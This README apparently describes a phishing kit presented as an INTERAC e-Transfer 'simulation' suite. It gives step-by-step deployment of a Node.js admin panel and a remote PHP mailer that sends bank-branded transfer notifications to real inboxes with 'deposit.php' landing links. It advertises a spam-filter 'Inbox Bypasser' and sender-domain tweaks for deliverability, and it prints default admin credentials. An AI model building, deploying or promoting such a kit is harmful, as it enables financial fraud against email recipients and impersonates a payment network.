# INTERAC e-Transfer Simulation & Mailer System

This project is a complete suite for simulating INTERAC e-Transfer banking screens, dispatching custom e-Transfer notification emails via a remote PHP mailer, and managing the settings through a secured Node.js + React Admin Panel.

## Architecture

The system consists of two main parts:

### 1. Node.js App (Main Application)
- **Frontend**: A React-based Single Page Application (SPA) providing the user interface for both regular simulated banking views and the hidden Admin Panel.
- **Backend**: An Express Node.js backend (`server.ts`) storing configuration, processing activities, and sending dispatch requests.

### 2. PHP Remote Mailer (Remote Server)
- A standalone PHP script suite (`remote_server_files.zip`) designed to be hosted on any web server (cPanel, Render PHP, VPS, or even TryCloudflare).
- Responsible for bypassing spam filters, sending the actual emails using PHP's `mail()` function, and hosting the landing `deposit.php` page.

---

## Installation & Setup Guide

### Phase 1: Deploying the Main Node.js Application
This application is designed to be hosted on platforms like Render, Heroku, Cloud Run, or your own Node.js VPS.

1. Install dependencies:
   ```bash
   npm install
   ```
2. For local development, run:
   ```bash
   npm run dev
   ```
3. For production deployment, build the app and start the server:
   ```bash
   npm run build
   npm start
   ```

### Phase 2: Deploying the Remote PHP Server
The PHP mailer files are bundled into `remote_server_files.zip` located in the root of this project. You must deploy these files to your own remote hosting/domain.

1. Extract `remote_server_files.zip`.
2. Upload the contents to the `public_html` or webroot of your PHP-enabled server.
   The structure on your server should look like this:
   ```
   yourdomain.com/
   ├── api/
   │   └── mailer.php
   ├── templates/
   │   └── Transfer.html
   └── deposit.php
   ```
3. Ensure the folder has the correct permissions to be accessed across the web.

### Phase 3: Connecting the App to the Remote Server
Once both systems are running, you need to point your Node.js app to your PHP Mailer domain.

1. Open your running Node.js Application.
2. Log into the **Admin Panel**. The default credentials (unless changed) can be found or set on first run (default: projectsarah / projectsarah / 1234 pin).
3. Navigate to **Settings -> Core**.
4. Set the **Base Action URL** to the domain where you uploaded the PHP files (e.g., `https://yourdomain.com`).
   *Note: Do not include a trailing slash.*
5. Click **Save Configuration**.

**That's it!**
When you use the Mailer tool in the Admin Panel to manually dispatch an email, the Node.js backend will securely relay the email payload to `https://yourdomain.com/api/mailer.php`. The PHP script will generate the email and encrypted landing page link and deliver it directly to the recipient's inbox.

---

## Features

- **Admin Panel Control**: Remotely control all simulated account balances, application settings, and view user activities in real time.
- **Email Dispatcher**: Use templates to send high-fidelity transfer notifications to accounts. Includes automated generation of `deposit.php` action URLs.
- **Universal Inbox Bypasser**: The PHP mailer is equipped with custom headers to minimize the chance of landing in spam folders.
- **Action Logs**: Detailed backend logging tracking who made what changes to the configuration, providing accountability for Admin actions.

## Troubleshooting

- **Admin Config Not Saving**: Ensure the `db` directory (especially `db/settings/`) exists and has write permissions for the Node.js process.
- **Email Not Arriving**:
   - Check if the remote PHP server's `mail()` function is enabled. Shared hosts often restrict it for unauthenticated mail.
   - For better deliverability, edit the `$fromEmail` address inside `remote_server/api/mailer.php` (around Line 140) to an email matching your domain (e.g., `notify@yourdomain.com`).
- **PHP Mailer Returns Error**: 
   - Ensure the PHP server accepts POST requests and has CORS enabled.
   - Ensure the `templates/` folder and `Transfer.html` template were correctly uploaded alongside the `api/` folder.
